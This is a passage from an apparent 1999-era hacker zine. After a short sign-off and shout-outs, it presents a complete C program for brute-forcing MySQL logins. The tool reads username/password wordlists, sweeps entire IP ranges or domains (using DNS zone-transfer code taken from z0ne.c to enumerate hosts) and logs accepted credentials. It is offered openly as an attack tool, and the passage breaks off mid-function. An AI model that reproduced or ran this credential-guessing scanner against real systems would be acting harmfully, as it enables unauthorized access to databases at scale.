+run into any trouble don't hesitate to mail me at dialect@stupidphat.com . Werd. Later.
+
+
+Shout Outs : #Phreak, #telconinjas, #!camarilla, #Telehack, #gay_teen_hackers. and Smartbeep.
+Werd to my friend 'Payga-hacka' who currently got arrested for pager fraud. Bro, bails coming soon.
+
+Elite Log of the day : [ * dialect slaps ls around a bit with a large trout ]
+
+
+
+
+ ______________________________________________________________
+|---------------> mysql brute force hax0rn by memor ---------- |->
+ ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
+
+	This is a brute force attack for mysql.  Save it as a .c file and hax0r away!
+      Remember! You will need the mysql libs to run it... also take note that the
+	ns part is ripped from z0ne.c/adm ....mad propz to them =]
+
+
+	|----------------------------> c0de st4rtz h3r3 <----------------------------|
+
+/****************************************************** 
+	Usage :
+	./code <ip/dns> [-fol <option> <brutefile> 
+        <logfile>]
+
+	./code x.x.x.x -ofl 0 loginpasswords.txt logfile
+	./code x.x.x.x -ofl 1 logins.txt logfile
+	./code x.x.x.x -ofl 2 logins.txt passwords.txt logfile
+
+	accept ip.[ip.ip.ip/*.*.*]
+	       *.domain
+
+	by memor - nsquery part by adm (z0ne)
+
+	to compile :
+	cc -o secpop3 -lresolv -lpthread
+
+********************************************************/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <netdb.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <signal.h>
+#include <arpa/nameser.h>
+#include <netdb.h>
+#include <resolv.h>
+#include <sys/wait.h>
+#include <pthread.h>
+#include <mysql.h>
+
+/**************************************************************/
+/* Define functions && g_vars && typedefs && threads && other */
+/**************************************************************/
+
+#define PLUSTH 0		/* 3 + x = (3+x) faster !! */
+#define PORTMYSQL   3306		/* port par defaut SQL */
+#define BVER "MySql"		/* Brute Force name */
+#define FICHIERPASS "pass.txt"	/* fichier passwords (mode 2) */
+#define FICHIER "brute.txt"	/* Brute force file */
+				/* Note about brute force file :
+				   #% comment comment
+				   Username	Password
+				   Username1	Passwird1  */
+#define TIMEOUT 10 		/* connect() timeout       */
+
+#define DNS_PORT 53
+
+#define CONNECT_TIMEOUT_VAL 15
+#define READ_TIMEOUT_VAL 50
+
+void usage();
+void* thread_1(void *);
+struct sockaddr_in FindHost(char *host,struct sockaddr_in CnxSock,int
+port);
+void alarm_timeout(int s);
+int scanhost(int scantype,char *host,char *fichier,char *fichierlog);
+int scaniprange(int scantype,char *host,char *fichier,char
+*fichierlog);
+int scandomain(int scantype,char *host,char *fichier,char
+*fichierlog);
+void alarm_timeout1(int s);
+int id_server(char *host,int port,char *fichierlog);
+void an_errcode(int err_code,char *username,char *password,int pas);
+int an_opt(int scantype,char *host,char *fichier,char *fichierlog);
+int scan_serv(int k);
+int t_ypeof_scan(char *host);
+int validfiles(char *fichier,int bmod);
+int global_brute(char *host,char *username,char *password);
+int sock_connect(int sock,struct sockaddr_in CnxSock);
+int caseo(int pas1,int count,int argc,char **argv);
+char * casel(int count,int pas1,int argc,char **argv);
+int brute(char *host,char *username,char *password);
+
+/* pour z0ne.c */
+
+void connect_and_read_timeout_handler();
+int addDomain(char *name);
+int nextDomain();
+int getAXFR(char *zone, char *serv);
+int parsepaq (char *paq, char *eom, char *zone);
+int getNS(char *zone);
+int nextNS();
+void ip_sort(u_long *list, u_long count, u_long *temp);
+void ip_print();
+typedef char* string; 
+
+/* pour z0ne.c */
+
+char *fichierlogb,*fichierb,*host,*fichier,*fichierp,*fichierlog;
+int sock,scantype;
+pthread_t *id;
+
+/*********************************************/
+/* declarations pour l'utilisation de z0ne.c */
+/*********************************************/
+
+int eoz = 0;
+int bmode = 0;
+int whichdaemon = 0;
+
+u_char *nslist_ptr, *nslist_cur;
+u_long nslist_size = 0;
+u_char *domlist_ptr, *domlist_cur;
+u_long domlist_size = 0;
+char *domain = NULL;
+char *nameserv = NULL;
+u_char *iplist_ptr;
+u_long iplist_count = 0;
+u_long *iplistt;
+
+int sorted = 1, localips = 0, allclassc = 0;
+
+/*********************************************/
+/* declarations pour l'utilisation de z0ne.c */
+/*********************************************/
+
+/**************************************************************/
+/* Connect() timeout like function                            */
+/**************************************************************/
+
+void alarm_timeout(int s)
+{
+int i;
+i=0;
+for(i=1;i<(4+PLUSTH);i++)
+	pthread_cancel(id[i]);
+return;
+}
+
+void alarm_timeout1(int s)
+{
+close(sock);
+return;
+}
+
+/**************************************************************/
+/* Scan domain function (call nsquery of z0ne functions       */
+/**************************************************************/
+
+int scandomain(int scantype,char *host,char *fichier,char *fichierlog)
+{
+	int x ;				
+	
+	addDomain(&host[2]);
+
+             while (nextDomain()) if (getNS(domain))
+                while (nextNS() && !getAXFR(domain, nameserv));
+                
+        if (sorted) {
+                iplistt = (u_long *)malloc(iplist_count * 4);
+                ip_sort((u_long *)iplist_ptr, iplist_count, iplistt);
+                ip_print();
+        }      
+
+
+}
+
+/******************************************************************/
+/* Scan ip-range function()                                       */
+/******************************************************************/
+
+int scaniprange(int scantype,char *host,char *fichier,char
+*fichierlog)
+{
+char tmp[4];		 /* pour les sauvegardes temporaires */
+char a[4][4]; 		 /* la totalitee d'une ip */
+int count,i,j,b[2]; 	 /* variables temporaires */
+
+count=0;j=0;
+while(count<strlen(host)) {
+	for(i=0;i<4;i++) tmp[i]='\0'; i=0;
+	while(count<strlen(host) && host[count]!='.') {
+		tmp[i]=host[count]; i++; count++;
+		}
+	strncpy(a[j],tmp,4);
+	j++;
+	count++;
+	}
+	b[0]=0;
+	do {
+		b[1]=0;	
+		do {
+			if(scantype>2) {
+			sprintf(tmp,"%d\0",b[1]);
+			strncpy(a[2],tmp,4);			
+			}
+			if(scantype==4) {
+			sprintf(tmp,"%d\0",b[0]);
+			strncpy(a[1],tmp,4);
+			}
+			for(i=0;i<255;i++) {
+			sprintf(host,"%s.%s.%s.%d",a[0],a[1],a[2],i);		
+			scanhost(scantype,host,fichier,fichierlog);
+			}
+		b[1]++;
+		} while(scantype==4 && b[1]<255);	
+	b[0]++; 
+	} while(scantype==4 && b[0]<255);
+return 0;
+}
+
+int scan_serv(int k)
+{
+int error_code;
+error_code = id_server(host,PORTMYSQL,fichierlog);
+return error_code;
+}
+
+
+/******************************************************************/
+/* Scan host function                                             */
+/******************************************************************/
+
+int scanhost(int scantype1,char *host2,char *fichier1,char
+*fichierlog1)
+{
+int error_code,i,k;	/* code d'erreur + temporaire */
+char host1[255];        /* host a scanner */
+id=malloc(4+PLUSTH);
+scantype=scantype1;
+host=host2;
+fichier=fichier1;
+fichierlog=fichierlog1;
+
+host[strlen(host)]='\0';
+if(host[strlen(host)-1]<20)
+host[strlen(host)-1]='\0';
+
+whichdaemon=0;
+					/* Creation des threads */
+if(scan_serv(0)!=2){
+
+	for(i=1;i<(4+PLUSTH);i++) {
+	sprintf(host1,"%d\0",i);
+	if((error_code=pthread_create(&id[i],NULL,thread_1,(void *) host1))!=0)
+		printf("Cant create threads!\n");
+	sleep(1);
+	}
+	for(i=1;i<(4+PLUSTH);i++)
+	pthread_join(id[i],NULL);
+	}
+return 0;
+
+}
+
+
+/***********************************************************************/
+/* THREAD DE SCAN DE FICHIER                                           */
+/***********************************************************************/
+
+void * thread_1(void *arg) 
+{ 
+int i,j,tst,pas,err_code,testx;  /* temporaire et codes d'erreurs */
+char buffer[255],ch; 	         /* Buffer d'envoi, caractere de fichier*/
+char *username,*password;        /* login,pass */
+FILE *fp,*fpb,*fpl,*fpp;         /* fichier,fichierlog */
+void *status;                    /* renvoi a la fin du thread */
+
+/* Repartition du travail entre les threads */
+
+pas=atoi((char *)arg); testx=0; host[strlen(host)]='\0';
+if(host[strlen(host)-1]<20) host[strlen(host)-1]='\0';
+
+/* Lecture du/des fichiers login/pass avec possibilite de comentaires 
+dans ceux ci par une nouvelle ligne commencant par #%                */
+
+username=malloc(20);password=malloc(20);
+for(i=0;i<20;i++){username[i]='\0';password[i]='\0';}
+if(bmode==2){if((fpp=fopen(fichierp,"r"))==NULL){perror("fopen");pthread_exit(status);}}
+do
+{
+if(bmode==2){if(feof(fpp)) testx=1;}
+
+for(i=0;i<20;i++){username[i]='\0';password[i]='\0';}
+if((fp=fopen(fichier,"r"))==NULL){perror("fopen");pthread_exit(status);}
+	j=1;
+	while(j<pas && !feof(fp)){
+	if(!feof(fp)) fscanf(fp,"%s",username);
+	if(bmode==0){
+		if(!feof(fp)) fscanf(fp,"%s",password); }
+	j++;
+	}
+if(bmode==2){ if(!feof(fpp)) fscanf(fpp,"%s",password); }
+
+while(!feof(fp)){
+	do{ tst=0;
+	if(!feof(fp)) fscanf(fp,"%s",username);
+	if(username[0]=='#' && username[1]=='%')
+	{
+	tst=1;
+		do{ fscanf(fp,"%c",&ch); printf(">%d<\r",ch); 
+		if(feof(fp)!=0){tst=0;  ch=10;} 
+		} while(ch!=10);
+	}
+	}while(tst!=0);
+
+	if(!feof(fp)) 
+	{ 
+	if(bmode==0) fscanf(fp,"%s",password);
+	if(bmode==1){ for(i=0;i<20;i++) password[i]='\0';
+		strncpy(password,username,strlen(username)); }
+
+if(strlen(password)!=0) 
+{	
+	err_code=global_brute(host,username,password);
+	for(i=strlen(username);i<10;i++) strcat(username," ");
+	for(i=strlen(password);i<10;i++) strcat(password," ");
+	an_errcode(err_code,username,password,pas);
+}
+	j=0;
+	while(j<(2+PLUSTH) && !feof(fp)){ 
+		if(!feof(fp)) fscanf(fp,"%s",username);
+		if(bmode==0)if(!feof(fp)) fscanf(fp,"%s",password);j++;
+	} }
+}
+fclose(fp);
+}while(testx==0 && bmode==2);
+pthread_exit(status);			/* Fin du thread */
+}
+
+/*********************************************************************/
+/* Choix du daemon a bruter					     */
+/*********************************************************************/
+
+int global_brute(char *host,char *username,char *password)
+{
+	int err_code;		/* Choix du daemon a attaquer */
+	err_code = brute(host,username,password);
+	return err_code;
+}
+	
+/*********************************************************************/
+/* Analysons le code d'erreur					     */
+/*********************************************************************/
+
+void an_errcode(int err_code,char *username,char *password,int pas)
+{
+FILE *fpl;	/* Fichier log */
+		/* Analyse des codes d'erreur pour succes ou echec */
+if(err_code!=1)
+{
+printf("%s - %s - Failed (%d)\n",username,password,pas);
+if(fichierlog!=NULL)
+{
+fpl=fopen(fichierlog,"a+");
+fprintf(fpl,"%s - %s - Failed\n",username,password);
+	fclose(fpl);
+}
+}
+else
+{
+printf("%s - %s - Accepted (%d)\n",username,password,pas);
+if(fichierlog!=NULL)
+{
+fpl=fopen(fichierlog,"a+");
+fprintf(fpl,"%s - %s - Accepted\n",username,password);
+fclose(fpl);
+}
+}
+
+}
+
+/*********************************************************************/
+/* Fonction id_server  						     */
+/*********************************************************************/
+
+int id_server(char *host,int port,char *fichierlog)
+{
+struct sockaddr_in CnxSock;
+int i,j;
+FILE *fp_id;
+char buffer[255];
+
+printf("\n. Connexion sur : %s - Port - %d -",host,port);
+
+CnxSock = FindHost(host,CnxSock,port);
+
+if ( (sock = socket(AF_INET, SOCK_STREAM, 0)) < 0 )
+	return(2);
+
+signal(SIGALRM,alarm_timeout);
+alarm(TIMEOUT);
+if(connect(sock,(struct sockaddr *)&CnxSock,sizeof(struct sockaddr))<0)
+{
+printf(" echec!\n");
+alarm(0);
+return(2);
+}
+
+alarm(0);
+for(i=0;i<255;i++) buffer[i]='\0';
+
+if ( recv(sock, buffer, 255, 0) < 0)    
+	return 2;
+
+printf(" Succes !\n",host,port);
+printf("Presentation du serveur : %s\n",buffer);
+if(fichierlog!=NULL) {
+	fp_id=fopen(fichierlog,"a+");
+	fprintf(fp_id,"\n. Connexion sur : %s - Port - %d\n",host,port);
+	fclose(fp_id);
+}
+close(sock);
+return 0;
+}
+
+/**********************************************************************/
+/* Function for Socket & Connexion				      */
+/**********************************************************************/
+
+int sock_connect(int sock,struct sockaddr_in CnxSock)
+{
+int timeout;
+if ( (sock = socket(AF_INET, SOCK_STREAM, 0)) < 0 )
+	return(-1);
+
+signal(SIGALRM,alarm_timeout);
+alarm(TIMEOUT);
+timeout=0;
+while(connect(sock,(struct sockaddr *)&CnxSock,sizeof(struct sockaddr)) <
+0 && timeout<10) { sleep(1); timeout++; }
+
+if(timeout>9)
+{
+	perror("connect");
+	alarm(0);
+	return(-1);
+}
+alarm(0);
+return sock;
+}
+
+/**********************************************************************/
+/* Function for bruteforcing Mysql				      */
+/**********************************************************************/
+
+int brute(char *host,char *username,char *password)
+{
+MYSQL *b;
+
+b=mysql_connect(NULL,host,username,password);
+
+if(b==NULL)
+return -1;
+else
+return 1;
+}
+
+
+/**********************************************************************/
+/* Fonction FindHost                                                  */
+/**********************************************************************/
+
+struct sockaddr_in FindHost(char *host,struct sockaddr_in CnxSock,int
+port)
+{
+struct hostent *hos;
+long addr;
+
+/* Si l'host est au format IP ou DNS ? */
+
+if(( hos = gethostbyname(host)) == NULL )
+{
+	addr=inet_addr(host);
+	memcpy(&CnxSock.sin_addr, &addr, sizeof(addr));
+	CnxSock.sin_family=AF_INET; 
+}
+else
+{
+	bzero((char *)&CnxSock,sizeof(CnxSock)); 
+	bcopy(hos->h_addr,(char *)&CnxSock.sin_addr,hos->h_length); 
+	CnxSock.sin_family=hos->h_addrtype; 
+}
+
+CnxSock.sin_port=htons(port); 
+
+return CnxSock;
+}
+
+/*********************************************************************/
+/* Type de scan()						     */
+/*********************************************************************/
+
+int t_ypeof_scan(char *host)
+{
+
+int pas,scantype;
+
+scantype=0;
+
+if(host[0]=='*'){ scantype=1; printf(". DomainScan \t:%s\n",host); }
+pas=0;
+if(host[strlen(host)-1]!='*') pas=1;
+if(host[strlen(host)-(1+pas)]=='*'){
+if(host[strlen(host)-(3+pas)]=='*'){
+if(host[strlen(host)-(5+pas)]=='*'){
+scantype=4; printf(". IP-scan*\t:%s\n",host);
+}else{
+scantype=3; printf(". IP-Scan+\t:%s\n",host); }
+}else{ scantype=2; printf(". IP-Scan \t:%s\n",host); }}
+if(host[0]!='*' && host[strlen(host)-1]!='*') printf(". Host \t\t:%s\n",host);
+return scantype;
+}
+
+
+/*********************************************************************/
+/* usage()                  					     */
+/*********************************************************************/
+
+void usage()
+{
+printf("English doc.!\n");
+printf("Scan a host with a file like echo login pass > pass.txt :\n");
+printf("./codenamez host -ofl 0 pass.txt logfile.txt\n");
+printf("Scan a host with a file like echo login > logins.txt :\n");
+printf("./codenamez host -ofl 1 logins.txt logfile.txt\n");
+printf("Scan a host with a file like echo login > logins.txt \n");
+printf("AND a file like echo pass > pass.txt :\n");
+printf("./codenamez host -ofl 2 logins.txt pass.txt logfile.txt\n");
+printf("\nhostsmsks allowed : x.*.*.* / x.x.*.* / x.x.x.* / x.x.x.x\n");
+printf(" / *.domain.com / box.domain.com\n");
+printf(" Have fun! memor - 1999 \n\n");
+}
+
+/**********************************************/
+/* Test d'ouverture des fichiers mis en cause */
+/**********************************************/
+
+int validfiles(char *fichier,int bmod)
+{
+FILE *fpl;
+
+/* Test d'ouverture des fichiers mis en cause */
+
+printf("\n");
+if((fpl=fopen(fichier,"r"))==NULL) {
+	perror("fopen");
+	printf("You need a valid file!\n");
+	usage();
+	return -1;
+	}
+fclose(fpl);
+
+if(bmode==2)
+{
+if((fpl=fopen(fichierp,"r"))==NULL) {
+	perror("fopen");
+	printf("You need a valid file!\n");
+	usage();
+	return -1;
+	}
+fclose(fpl);
+}
+}
+
+/**********************************************************************/
+/* Analyses des argv						      */
+/**********************************************************************/
+
+int an_opt(int scantype,char *host,char *fichier,char *fichierlog)
+{
+int pas;		/* pas dans argc */
+char *tempfichier;	/* fichier temporaire */
+FILE *fpl;		/* fichier log */
+
+/* Savoir si c'est un scan ip.* ou *.Domain ou Host */
+
+scantype=t_ypeof_scan(host);
+
+/* Fichier logs, gestion du type de scan et appele de la bonne 
+fonction */
+
+printf(". Fichier l/p \t:%s\n",fichier);
+if(fichierlog!=NULL) {
+printf(". Fichier log \t:%s\n",fichierlog);
+fpl=fopen(fichierlog,"w"); fprintf(fpl,"\n"); fclose(fpl); }
+else printf(". Fichier log \t:Aucun\n");
+if(validfiles(fichier,bmode)<0) return 0;
+
+switch(scantype) {
+	case 0   : scanhost(scantype,host,fichier,fichierlog); break;
+	case 1   : scandomain(scantype,host,fichier,fichierlog); break;
+	default  : scaniprange(scantype,host,fichier,fichierlog);break;
+	}	
+
+if(bmode==2)
+{	tempfichier=fichierp;
+	fichierp=fichier;
+	fichier=tempfichier;
+	tempfichier=NULL; 
+}
+}
+
+/**********************************************************************/
+/* Etude de l'argument l 					      */
+/**********************************************************************/
+
+char * casel(int count,int pas1,int argc,char **argv)
+{
+if(argc>(2+count+pas1)){
+   fichierlog=malloc(strlen(argv[pas1+2+count]));
+   fichierlogb=malloc(strlen(pas1+argv[2+count]));
+   strncpy(fichierlog,argv[pas1+2+count],strlen(argv[pas1+2+count]));
+   strncpy(fichierlogb,argv[pas1+2+count],strlen(argv[pas1+2+count]));
+   }else{
+   usage(); 
+   return NULL;
+   }
+return fichierlog;
+}
+
+/**********************************************************************/
+/* Etude de l'argument o 					      */
+/**********************************************************************/
+
+int caseo(int pas1,int count,int argc,char **argv)
+{
+if(argc>(pas1+2+count)){
+   if(argv[pas1+2+count][0]=='0')   return 0;
+   if(argv[pas1+2+count][0]=='1')   return 1;
+   if(argv[pas1+2+count][0]=='2')   return 2;
+   }
+   else
+   {
+   usage(); 
+   return(-1);
+   }
+}
+
+/**********************************************************************/
+/* main()                                                             */
+/**********************************************************************/
+
+int main(int argc,char *argv[])
+{
+int count,pas,pas1,err_code,scantype; /* codes d'erreur, type de scan */
+char *fichier,*fichierlog,*host;      /* fichierl/p,fichier log,host */
+
+fichierlog=NULL;fichierlogb=NULL;
+
+printf("Brute%s - <secmanage.com> 1999\n\n",BVER); 
+bmode=0; pas1=0;
+if(argc<2) {
+	usage();
+	return 0;
+	}
+
+host=malloc(strlen(argv[1])); strncpy(host,argv[1],strlen(argv[1]));
+
+fichier=malloc(strlen(FICHIER));
+strncpy(fichier,FICHIER,strlen(FICHIER));
+fichierb=malloc(strlen(FICHIER));
+strncpy(fichierb,FICHIER,strlen(FICHIER));
+fichierp=malloc(strlen(FICHIERPASS));
+strncpy(fichierp,FICHIERPASS,strlen(FICHIERPASS));
+
+/* Analyse des arguments pour toutes les options possibles */
+/* o <- type de lecture du fichier login/pass ..
+	0 : lecture d'un login puis d'un pass
+ 	1 : lecture d'un login = pass
+	2 : lecture d'un login en fichier login 
+	    lecture d'un pass en fichier pass 
+    f <- definir un fichier login/pass  (si o=2 definir deux fichier)
+    l <- definir le fichier log				 */
+
+if(argc<2) { usage(); return 0; }
+if(argc>2) {
+	if(argv[2][0]=='-') {
+		count = 1;
+		while(strlen(argv[2])!=count) {
+			switch(argv[2][count]) {
+                                case 'o' : {
+				if((bmode=caseo(pas1,count,argc,argv))<0)   return 0; 
+				break;
+					}	  
+                                case 'f' : {
+                                        if(argc>(pas1+2+count)){
+					if(bmode!=2)
+					{
+					fichier=malloc(strlen(argv[pas1+2+count]));
+					fichierb=malloc(strlen(argv[pas1+2+count]));
+					strncpy(fichier,argv[pas1+2+count],strlen(argv[pas1+2+count]));
+					strncpy(fichierb,argv[pas1+2+count],strlen(argv[pas1+2+count]));
+                                        }else
+					{
+					fichier=malloc(strlen(argv[pas1+2+count]));
+					fichierb=malloc(strlen(argv[pas1+2+count]));
+					fichierp=malloc(strlen(argv[pas1+3+count]));
+					strncpy(fichierp,argv[pas1+3+count],strlen(argv[pas1+3+count]));
+					strncpy(fichier,argv[pas1+2+count],strlen(argv[pas1+2+count]));
+					strncpy(fichierb,argv[pas1+2+count],strlen(argv[pas1+2+count]));
+					pas1++;
+					}
+					}else {usage(); return 0;}
+                                        break; }
+                                case 'l' : {
+if((fichierlog=casel(count,pas1,argc,argv))==NULL) return 0;
+                                        break; }
+				default  : { usage(); return 0; }
+			}
+		count++;
+		}
+	} else { usage(); return 0; }
+}
+
+an_opt(scantype,host,fichier,fichierlog);
+printf("\nAll done.\n");
+return 0;
+}
+ 
+/* <8644@mne.net> */
+
+/*****************************************************************/
+/* RIP FROM the well known z0ne.c made by ADM for the ns query ..
+z0ne.c does like 1000* more work than this lame rip so get it... */
+/*****************************************************************/
+
+void connect_and_read_timeout_handler() {       /* nice name, huh? :) */
+        close(sock);
+}
+
+typedef union {
+        HEADER qb1;
+        u_char qb2[PACKETSZ];
+} querybuf;
+
+int addIP(u_char *ip) {
+        u_long *ip1, *ip2;
+        
+        ip2 = (u_long *)ip;
+        *ip2 = htonl(*ip2); 
+
+        if (allclassc) *ip = 0;
+         
+        if ((!localips) && (*(ip + 3) == 127)) return(0);
+                
+        if (iplist_count == 0) {
+                iplist_count++;
+                iplist_ptr = (char *)malloc(iplist_count * 4);
+                ip1 = (u_long *)iplist_ptr;
+                *ip1 = *ip2;
+                *ip2 = htonl(*ip2);
+                return(1);
+        }
+        
+        ip1 = (u_long *)iplist_ptr;
+        while (ip1 < (u_long *)(iplist_ptr + (iplist_count * 4))) {
+                if (*ip1 == *ip2) return(0);
+                ip1++;
+        }
+                
+        iplist_count++;
+        iplist_ptr = (char *)realloc(iplist_ptr, iplist_count * 4);
+        ip1 = (u_long *)(iplist_ptr + ((iplist_count *4) - 4));
+        *ip1 = *ip2;
+        *ip2 = htonl(*ip2);
+        return(1);
+}
+         
+int addDomain(char *name) {
+        u_char *tmp;   
+        u_long x;
+        
+        if (domlist_size == 0) {
+                domlist_size = strlen(name) + 1;
+                domlist_ptr = (char *)malloc(domlist_size);
+                domlist_cur = domlist_ptr;
+                memcpy(domlist_ptr, name, strlen(name) + 1);
+                return(1);
+        }
+
+        tmp = domlist_ptr;
+        while (tmp < (domlist_ptr + domlist_size)) {
+                if ((strlen(name) == strlen(tmp))
+                && (!strncasecmp(name, tmp, strlen(tmp))))
+                        return(0);
+                tmp += strlen(tmp) + 1;   
+        }
+         
+        x = domlist_cur - domlist_ptr;
+        domlist_size += strlen(name) + 1;
+        domlist_ptr = (char *)realloc(domlist_ptr, domlist_size);
+        domlist_cur = domlist_ptr + x;
+        memcpy((domlist_ptr + domlist_size) - (strlen(name) + 1), name, 
+strlen(name) + 1);
+
+                        
+        return(1);
+}
+         
+        
+int nextDomain() {
+        if ((domlist_cur - domlist_ptr) >= domlist_size)
+                return(0);
+        
+        if (domain != NULL) free(domain);
+        domain = (u_char *)malloc(strlen(domlist_cur) + 1);
+        memcpy(domain, domlist_cur, strlen(domlist_cur) + 1);
+ 
+        domlist_cur += strlen(domlist_cur) + 1;
+        return(1);
+}
+        
+                
+int parsepaq (char *paq, char *eom, char *zone) {
+        register u_char *cp = paq + HFIXEDSZ;
+        HEADER *headerPtr = (HEADER *)paq;
+        char name[512];
+        int nameLen, type, class, dlen, x;
+        u_int32_t ttl;
+        struct in_addr in;
+ 
+        if (headerPtr->rcode != 0) return(0);
+        if (headerPtr->ancount <= 0) return(0);
+
+        if (ntohs(headerPtr->qdcount) > 0) { 
+                nameLen = dn_skipname(cp, eom);
+                if (nameLen < 0) return(0);
+                cp += nameLen + QFIXEDSZ; 
+        }
+        nameLen = dn_expand(paq, eom, cp, name, sizeof(name));
+        if (nameLen < 0) return(0);
+        cp += nameLen;
+        
+        type = _getshort((u_char *)cp);
+        cp += 2;
+        class = _getshort((u_char *)cp);
+        cp += 2;
+        ttl = _getlong((u_char *)cp);
+        cp += 4;
+        dlen = _getshort((u_char *)cp);
+        cp += 2;
+        
+        if (class != C_IN) return(1);
+
+	if (type == T_A) {
+                memcpy((char *)&in, cp, 4);
+                if (dlen != 4 && dlen != 7) return(1);
+                if (
+                        (strlen(name) >= strlen(zone)) &&
+                        !strncasecmp(zone, name + (strlen(name) -
+strlen(zone)), strlen(zone))
+                ) {
+                        if (addIP(cp) && !sorted) {
+                                if (allclassc) {
+                                        in.s_addr &= 0xffffff;
+                                        for (x = 0; x <= 255; x++) {
+                                                printf("%s\n",
+inet_ntoa(in));
+                                                in.s_addr =
+htonl(htonl(in.s_addr) +1);
+                                        }
+                                } else printf("%s\n", inet_ntoa(in));
+                                fflush(stdout);
+                        }
+                }
+        } else
+        if (type == T_NS) {
+                if (
+                        (strlen(name) >= strlen(zone)) &&
+                        !strncasecmp(zone, name + (strlen(name) -
+strlen(zone)),strlen(zone))
+                ) {
+                        addDomain(name);
+                }
+        } else
+        if (type == T_SOA) {
+                eoz++;
+        }
+        return(1);
+}
+                   
+int getAXFR(char *zone, char *serv) {   
+        struct hostent *hp;
+        struct sockaddr_in sa;
+        long addr;
+        int stat;
+         
+        querybuf buf;
+        int msglen;
+        u_short len;
+        u_char *cp;
+        int amtToRead;
+        int numRead;
+        static int answerLen = 0;
+        static u_char *answer = NULL;
+        HEADER *headerPtr;
+         
+        msglen = res_mkquery(QUERY, zone, C_IN, T_AXFR, NULL,
+                            0, 0, buf.qb2, sizeof(buf));
+        if (msglen == -1) 
+	return(0);
+ 
+        memset(&sa, 0, sizeof(sa));
+        
+        if ((addr = inet_addr(serv)) != -1) {
+                if (addr == 0) return(0);
+                memcpy(&sa.sin_addr, &addr, sizeof(addr));
+                sa.sin_family = AF_INET;
+        } else {
+                if ((hp = gethostbyname(serv)) == NULL) return(0);
+                memcpy(&sa.sin_addr, hp->h_addr, hp->h_length);
+                sa.sin_family = hp->h_addrtype;
+        }
+        sa.sin_port = htons((u_short) DNS_PORT);
+ 
+        if ((sock = socket(sa.sin_family, SOCK_STREAM, 0)) < 0) return(0);
+                
+        signal(SIGALRM, (void *)connect_and_read_timeout_handler);
+        alarm(CONNECT_TIMEOUT_VAL);
+        if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
+                alarm(0);
+                return(0);
+        }
+        alarm(0);
+ 
+        __putshort(msglen, (u_char *)&len);
+                
+        if (write(sock, (char *)&len, 2) != 2 ||
+            write(sock, (char *)&buf, msglen) != msglen) {
+                close(sock);
+                return(0);
+        }
+         
+        while(1) {
+                cp = (u_char *)&len;
+                amtToRead = 2;
+                
+                signal(SIGALRM, (void *)connect_and_read_timeout_handler);
+                alarm(READ_TIMEOUT_VAL);
+               while ((numRead = read(sock, cp, amtToRead)) > 0) {
+                        alarm(READ_TIMEOUT_VAL);
+                        cp += numRead;
+                        if ((amtToRead -= numRead) <= 0)
+                                break;
+                }
+                alarm(0);
+                
+                if (numRead <= 0) break;
+                if ((len = htons(len)) == 0) break;
+                
+                if (len > (u_int)answerLen) {   
+                        if (answerLen != 0) free(answer);
+                        answerLen = len;
+                        answer = (u_char *)malloc(answerLen);
+                }
+                
+                amtToRead = len;
+                cp = answer;
+                signal(SIGALRM, (void *)connect_and_read_timeout_handler);
+                alarm(READ_TIMEOUT_VAL);
+                while (amtToRead > 0 && (numRead = read(sock, cp,
+amtToRead)) >0) { 
+                        alarm(READ_TIMEOUT_VAL);
+                        cp += numRead;  
+                        amtToRead -= numRead;
+                }
+                alarm(0);
+                if (numRead <= 0) break;
+                
+                if (!parsepaq(answer, cp, zone)) {
+                        close(sock);
+                        return(0);
+                }
+                if (eoz == 2) {
+                        close(sock);
+                        eoz = 0;
+                        return(1);
+                }
+        }       
+       close(sock);
+        return(1);
+}
+         
+int getNS(char *zone) {
+        querybuf buf, answer;   
+        int msglen, nscount, numns, numsaddr, type, dlen;
+        char dom[512], name[512];
+        u_char *cp;
+        msglen = res_mkquery(QUERY, zone, C_IN, T_NS, NULL,
+                             0, 0, buf.qb2, sizeof(buf));
+        if (msglen < 0) return(0);
+         
+        msglen = res_send(buf.qb2, msglen, answer.qb2, sizeof(answer));
+        if (msglen < 0) return(0);
+        
+        nscount = ntohs(answer.qb1.ancount) + ntohs(answer.qb1.nscount) +
+                  ntohs(answer.qb1.arcount);
+        if (answer.qb1.rcode != 0 || nscount == 0) return(0);
+                             
+        cp = (u_char *)answer.qb2 + HFIXEDSZ;
+        if (ntohs(answer.qb1.qdcount) > 0)
+                cp += dn_skipname(cp, answer.qb2 + msglen) + QFIXEDSZ; 
+ 
+        numns = numsaddr = 0;
+        
+        if (nslist_size != 0) {
+                free(nslist_ptr);
+                nslist_size = 0;
+        }                    
+        
+        for (;nscount; nscount--) {
+                cp += dn_expand(answer.qb2, answer.qb2 + msglen, cp,   
+                                dom, sizeof(dom));
+                type = _getshort(cp);
+                cp += 8;
+                dlen = _getshort(cp);
+                cp += 2;
+                
+                if (type == T_NS) {
+                        if (dn_expand(answer.qb2, answer.qb2 + msglen, cp,
+                            name, sizeof(name)) >= 0) {
+                                if (nslist_size == 0) {
+                                        nslist_size = strlen(name) + 1;
+                                        nslist_ptr = (char
+*)malloc(nslist_size);
+                                        nslist_cur = nslist_ptr;
+                                } else {
+                                        nslist_size += strlen(name) + 1;
+                                        nslist_ptr = (char
+*)realloc(nslist_ptr, nslist_size);
+                                        nslist_cur = (nslist_ptr +
+nslist_size)-(strlen(name)+1);
+                                }
+                                memcpy(nslist_cur, name, strlen(name) +
+1);
+                        }
+                }
+                cp += dlen;
+        }
+                                
+        nslist_cur = nslist_ptr;
+       return(1);
+}
+                                 
+int nextNS() {
+        if ((nslist_cur - nslist_ptr) >= nslist_size)
+                return(0);
+                
+        if (nameserv != NULL) free(nameserv);
+        nameserv = (u_char *)malloc(strlen(nslist_cur) + 1);
+        memcpy(nameserv, nslist_cur, strlen(nslist_cur) + 1);
+       
+        nslist_cur += strlen(nslist_cur) + 1;
+        return(1);               
+}
+        
+void ip_sort(u_long *list, u_long count, u_long *temp) {
+        u_long nlo, nhi;
+        u_long *lo, *hi, *t;
+
+        if (count == 2) {
+                if (*list > *(list + 1))
+                        *temp = *list, *list = *(list + 1), *(list + 1) =
+*temp;
+                return;          
